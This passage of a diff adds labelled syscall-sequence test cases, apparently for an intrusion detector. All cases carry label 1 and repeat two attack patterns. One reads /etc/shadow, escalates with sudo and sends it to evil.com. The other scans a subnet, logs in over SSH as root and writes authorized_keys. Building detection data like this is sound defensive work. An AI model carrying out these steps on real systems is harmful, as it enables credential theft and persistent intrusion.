+        "resource": "evil.com:443",
+        "params": "shadow"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "MS-028",
+    "category": "multi_step",
+    "events": [
+      {
+        "syscall": "openat",
+        "resource": "/etc/passwd",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/id",
+        "params": ""
+      },
+      {
+        "syscall": "openat",
+        "resource": "/etc/shadow",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/sudo",
+        "params": "su"
+      },
+      {
+        "syscall": "tcp_sendmsg",
+        "resource": "evil.com:443",
+        "params": "shadow"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "MS-029",
+    "category": "multi_step",
+    "events": [
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.0/24:22",
+        "params": "scan"
+      },
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.5:22",
+        "params": "ssh"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/ssh",
+        "params": "root@10.0.0.5"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/root/.ssh/authorized_keys",
+        "params": "O_WRONLY"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "MS-030",
+    "category": "multi_step",
+    "events": [
+      {
+        "syscall": "openat",
+        "resource": "/etc/passwd",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/id",
+        "params": ""
+      },
+      {
+        "syscall": "openat",
+        "resource": "/etc/shadow",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/sudo",
+        "params": "su"
+      },
+      {
+        "syscall": "tcp_sendmsg",
+        "resource": "evil.com:443",
+        "params": "shadow"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "MS-031",
+    "category": "multi_step",
+    "events": [
+      {
+        "syscall": "openat",
+        "resource": "/etc/passwd",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/id",
+        "params": ""
+      },
+      {
+        "syscall": "openat",
+        "resource": "/etc/shadow",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/sudo",
+        "params": "su"
+      },
+      {
+        "syscall": "tcp_sendmsg",
+        "resource": "evil.com:443",
+        "params": "shadow"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "MS-032",
+    "category": "multi_step",
+    "events": [
+      {
+        "syscall": "openat",
+        "resource": "/etc/passwd",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/id",
+        "params": ""
+      },
+      {
+        "syscall": "openat",
+        "resource": "/etc/shadow",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/sudo",
+        "params": "su"
+      },
+      {
+        "syscall": "tcp_sendmsg",
+        "resource": "evil.com:443",
+        "params": "shadow"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "MS-033",
+    "category": "multi_step",
+    "events": [
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.0/24:22",
+        "params": "scan"
+      },
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.5:22",
+        "params": "ssh"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/ssh",
+        "params": "root@10.0.0.5"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/root/.ssh/authorized_keys",
+        "params": "O_WRONLY"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "MS-034",
+    "category": "multi_step",
+    "events": [
+      {
+        "syscall": "openat",
+        "resource": "/etc/passwd",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/id",
+        "params": ""
+      },
+      {
+        "syscall": "openat",
+        "resource": "/etc/shadow",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/sudo",
+        "params": "su"
+      },
+      {
+        "syscall": "tcp_sendmsg",
+        "resource": "evil.com:443",
+        "params": "shadow"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "MS-035",
+    "category": "multi_step",
+    "events": [
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.0/24:22",
+        "params": "scan"
+      },
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.5:22",
+        "params": "ssh"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/ssh",
+        "params": "root@10.0.0.5"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/root/.ssh/authorized_keys",
+        "params": "O_WRONLY"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "MS-036",
+    "category": "multi_step",
+    "events": [
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.0/24:22",
+        "params": "scan"
+      },
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.5:22",
+        "params": "ssh"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/ssh",
+        "params": "root@10.0.0.5"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/root/.ssh/authorized_keys",
+        "params": "O_WRONLY"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "MS-037",
+    "category": "multi_step",
+    "events": [
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.0/24:22",
+        "params": "scan"
+      },
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.5:22",
+        "params": "ssh"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/ssh",
+        "params": "root@10.0.0.5"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/root/.ssh/authorized_keys",
+        "params": "O_WRONLY"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "MS-038",
+    "category": "multi_step",
+    "events": [
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.0/24:22",
+        "params": "scan"
+      },
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.5:22",
+        "params": "ssh"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/ssh",
+        "params": "root@10.0.0.5"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/root/.ssh/authorized_keys",
+        "params": "O_WRONLY"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "MS-039",
+    "category": "multi_step",
+    "events": [
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.0/24:22",
+        "params": "scan"
+      },
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.5:22",
+        "params": "ssh"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/ssh",
+        "params": "root@10.0.0.5"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/root/.ssh/authorized_keys",
+        "params": "O_WRONLY"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "MS-040",
+    "category": "multi_step",
+    "events": [
+      {
+        "syscall": "openat",
+        "resource": "/etc/passwd",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/id",
+        "params": ""
+      },
+      {
+        "syscall": "openat",
+        "resource": "/etc/shadow",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/sudo",
+        "params": "su"
+      },
+      {
+        "syscall": "tcp_sendmsg",
+        "resource": "evil.com:443",
+        "params": "shadow"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "MS-041",
+    "category": "multi_step",
+    "events": [
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.0/24:22",
+        "params": "scan"
+      },
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.5:22",
+        "params": "ssh"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/ssh",
+        "params": "root@10.0.0.5"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/root/.ssh/authorized_keys",
+        "params": "O_WRONLY"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "MS-042",
+    "category": "multi_step",
+    "events": [
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.0/24:22",
+        "params": "scan"
+      },
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.5:22",
+        "params": "ssh"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/ssh",
+        "params": "root@10.0.0.5"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/root/.ssh/authorized_keys",
+        "params": "O_WRONLY"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "MS-043",
+    "category": "multi_step",
+    "events": [
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.0/24:22",
+        "params": "scan"
+      },
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.5:22",
+        "params": "ssh"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/ssh",
+        "params": "root@10.0.0.5"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/root/.ssh/authorized_keys",
+        "params": "O_WRONLY"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "MS-044",
+    "category": "multi_step",
+    "events": [
+      {
+        "syscall": "openat",
+        "resource": "/etc/passwd",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/id",
+        "params": ""
+      },
+      {
+        "syscall": "openat",
+        "resource": "/etc/shadow",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/sudo",
+        "params": "su"
+      },
+      {
+        "syscall": "tcp_sendmsg",
+        "resource": "evil.com:443",
+        "params": "shadow"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "MS-045",
+    "category": "multi_step",
+    "events": [
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.0/24:22",
+        "params": "scan"
+      },
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.5:22",
+        "params": "ssh"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/ssh",
+        "params": "root@10.0.0.5"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/root/.ssh/authorized_keys",
+        "params": "O_WRONLY"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "MS-046",
+    "category": "multi_step",
+    "events": [
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.0/24:22",
+        "params": "scan"
+      },
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.5:22",
+        "params": "ssh"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/ssh",
+        "params": "root@10.0.0.5"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/root/.ssh/authorized_keys",
+        "params": "O_WRONLY"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "MS-047",
+    "category": "multi_step",
+    "events": [
+      {
+        "syscall": "openat",
+        "resource": "/etc/passwd",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/id",
+        "params": ""
+      },
+      {
+        "syscall": "openat",
+        "resource": "/etc/shadow",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/sudo",
+        "params": "su"
+      },
+      {
+        "syscall": "tcp_sendmsg",
+        "resource": "evil.com:443",
+        "params": "shadow"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "MS-048",
+    "category": "multi_step",
+    "events": [
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.0/24:22",
+        "params": "scan"
+      },
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.5:22",
+        "params": "ssh"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/ssh",
+        "params": "root@10.0.0.5"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/root/.ssh/authorized_keys",
+        "params": "O_WRONLY"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "MS-049",
+    "category": "multi_step",
+    "events": [
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.0/24:22",
+        "params": "scan"
+      },
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.5:22",
+        "params": "ssh"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/ssh",
+        "params": "root@10.0.0.5"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/root/.ssh/authorized_keys",
+        "params": "O_WRONLY"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "MS-050",
+    "category": "multi_step",
+    "events": [
+      {
+        "syscall": "openat",
+        "resource": "/etc/passwd",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/id",
+        "params": ""
+      },
+      {
+        "syscall": "openat",
+        "resource": "/etc/shadow",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/sudo",
+        "params": "su"
+      },
+      {
+        "syscall": "tcp_sendmsg",
+        "resource": "evil.com:443",
+        "params": "shadow"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "MS-051",
+    "category": "multi_step",
+    "events": [
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.0/24:22",
+        "params": "scan"
+      },
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.5:22",
+        "params": "ssh"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/ssh",
+        "params": "root@10.0.0.5"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/root/.ssh/authorized_keys",
+        "params": "O_WRONLY"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "MS-052",
+    "category": "multi_step",
+    "events": [
+      {
+        "syscall": "openat",
+        "resource": "/etc/passwd",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/id",
+        "params": ""
+      },
+      {
+        "syscall": "openat",
+        "resource": "/etc/shadow",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/sudo",
+        "params": "su"
+      },
+      {
+        "syscall": "tcp_sendmsg",
+        "resource": "evil.com:443",
+        "params": "shadow"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "MS-053",
+    "category": "multi_step",
+    "events": [
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.0/24:22",
+        "params": "scan"
+      },
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.5:22",
+        "params": "ssh"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/ssh",
+        "params": "root@10.0.0.5"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/root/.ssh/authorized_keys",
+        "params": "O_WRONLY"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "MS-054",
+    "category": "multi_step",
+    "events": [
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.0/24:22",
+        "params": "scan"
+      },
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.5:22",
+        "params": "ssh"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/ssh",
+        "params": "root@10.0.0.5"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/root/.ssh/authorized_keys",
+        "params": "O_WRONLY"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "MS-055",
+    "category": "multi_step",
+    "events": [
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.0/24:22",
+        "params": "scan"
+      },
+      {
+        "syscall": "tcp_v4_connect",
+        "resource": "10.0.0.5:22",
+        "params": "ssh"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/ssh",
+        "params": "root@10.0.0.5"
+      },
+      {
+        "syscall": "openat",
+        "resource": "/root/.ssh/authorized_keys",
+        "params": "O_WRONLY"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "MS-056",
+    "category": "multi_step",
+    "events": [
+      {
+        "syscall": "openat",
+        "resource": "/etc/passwd",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/id",
+        "params": ""
+      },
+      {
+        "syscall": "openat",
+        "resource": "/etc/shadow",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/sudo",
+        "params": "su"
+      },
+      {
+        "syscall": "tcp_sendmsg",
+        "resource": "evil.com:443",
+        "params": "shadow"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "MS-057",
+    "category": "multi_step",
+    "events": [
+      {
+        "syscall": "openat",
+        "resource": "/etc/passwd",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/id",
+        "params": ""
+      },
+      {
+        "syscall": "openat",
+        "resource": "/etc/shadow",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/sudo",
+        "params": "su"
+      },
+      {
+        "syscall": "tcp_sendmsg",
+        "resource": "evil.com:443",
+        "params": "shadow"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "MS-058",
+    "category": "multi_step",
+    "events": [
+      {
+        "syscall": "openat",
+        "resource": "/etc/passwd",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/id",
+        "params": ""
+      },
+      {
+        "syscall": "openat",
+        "resource": "/etc/shadow",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/sudo",
+        "params": "su"
+      },
+      {
+        "syscall": "tcp_sendmsg",
+        "resource": "evil.com:443",
+        "params": "shadow"
+      }
+    ],
+    "gold_label": 1
+  },
+  {
+    "case_id": "MS-059",
+    "category": "multi_step",
+    "events": [
+      {
+        "syscall": "openat",
+        "resource": "/etc/passwd",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/id",
+        "params": ""
+      },
+      {
+        "syscall": "openat",
+        "resource": "/etc/shadow",
+        "params": "O_RDONLY"
+      },
+      {
+        "syscall": "execve",
+        "resource": "/usr/bin/sudo",
+        "params": "su"
+      },
+      {
+        "syscall": "tcp_sendmsg",
+        "resource": "evil.com:443",
+        "params": "shadow"
+      }
+    ],
+    "gold_label": 1
+  }
+]
